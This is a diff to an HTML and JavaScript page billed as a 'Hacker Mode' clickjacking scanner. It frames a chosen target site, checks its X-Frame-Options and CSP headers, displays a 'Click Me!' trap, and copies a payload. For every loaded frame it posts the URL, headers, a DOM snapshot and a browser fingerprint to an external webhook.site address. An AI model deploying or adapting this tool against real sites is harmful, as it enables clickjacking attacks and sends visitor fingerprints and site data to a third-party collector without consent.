@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Ultra Clickjack Scanner v3 - Hacker Mode</title>
+  <title>Ultra Clickjack Scanner v3.1 - Hacker Mode</title>
   <style>
     body {
       background: #000;
@@ -52,20 +52,26 @@
 </head>
 <body>
   <div id="hud">
-    🛡️ <b>Ultra Clickjack Scanner v3</b> - Hacker Mode<br>
+    🛡️ <b>Ultra Clickjack Scanner v3.1</b> - Hacker Mode<br>
     ✅ Green = VULNERABLE<br>
+    ⚠️ Orange = FRAMEABLE (But CSP/XFO exists)<br>
     ❌ Red = BLOCKED<br>
     🕵️ Trap + DOM Snapshot + Header Parser Active
   </div>
   <div id="clickTrap"> 🎯 Click Me!</div>
   <script>
-    const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // <-- Replace this
+    const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // Replace with your webhook
 
     const urlParams = new URLSearchParams(window.location.search);
-    const origin = urlParams.get("target");
+    let origin = urlParams.get("target");
+
     if (!origin) {
-      alert("❌ Missing target URL. Add ?target=https://example.com");
-      throw new Error("Missing ?target parameter in URL");
+      origin = prompt("🚨 Enter target URL (e.g., https://example.com):");
+    }
+
+    if (!origin || !/^https?:\/\/[^ ]+$/i.test(origin)) {
+      alert("❌ Invalid or missing target URL. Please provide a valid ?target= parameter or enter it manually.");
+      throw new Error("Invalid target.");
     }
 
     const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
@@ -131,46 +137,47 @@
       document.body.appendChild(div);
 
       frame.onload = async () => {
+        let snapshot = "Cross-origin (DOM access blocked)";
         try {
-          const doc = frame.contentDocument || frame.contentWindow.document;
-          const snapshot = getDOMSnapshot(doc);
-          frame.style.border = "5px solid lime";
-          div.style.borderColor = "lime";
-          div.innerText = `✅ ${fullURL}\nDOM Snapshot: ${snapshot}\nXFO: ${xfo}\nCSP: ${csp}`;
-          copyPayload(fullURL);
-          await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              type: "VULNERABLE",
-              url: fullURL,
-              fingerprint: fingerprint(),
-              snapshot: snapshot,
-              headers
-            })
-          });
+          if (new URL(fullURL).origin === window.location.origin) {
+            const doc = frame.contentDocument || frame.contentWindow.document;
+            snapshot = getDOMSnapshot(doc);
+          }
         } catch (e) {
-          frame.style.border = "5px solid red";
-          div.style.borderColor = "red";
-          div.innerText = `❌ ${fullURL}\nBLOCKED (DOM Exception)\nXFO: ${xfo}\nCSP: ${csp}\n${e}`;
-          await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              type: "BLOCKED",
-              url: fullURL,
-              error: e.toString(),
-              fingerprint: fingerprint(),
-              headers
-            })
-          });
+          snapshot = "DOM access error: " + e;
         }
+
+        const vulnerable = (xfo === 'NONE' && csp === 'NONE');
+        const borderColor = vulnerable ? "lime" : "orange";
+        frame.style.border = `5px solid ${borderColor}`;
+        div.style.borderColor = borderColor;
+
+        div.innerText = `${vulnerable ? '✅' : '⚠️'} ${fullURL}
+DOM Snapshot: ${snapshot}
+XFO: ${xfo}
+CSP: ${csp}`;
+
+        copyPayload(fullURL);
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            type: vulnerable ? "VULNERABLE" : "FRAMEABLE-BUT-CSP/XFO",
+            url: fullURL,
+            fingerprint: fingerprint(),
+            snapshot,
+            headers
+          })
+        });
       };
 
       frame.onerror = () => {
         frame.style.border = "5px solid red";
         div.style.borderColor = "red";
-        div.innerText = `❌ ${fullURL}\nBLOCKED (Load Error)\nXFO: ${xfo}\nCSP: ${csp}`;
+        div.innerText = `❌ ${fullURL}
+BLOCKED (Load Error)
+XFO: ${xfo}
+CSP: ${csp}`;
       };
     };
 
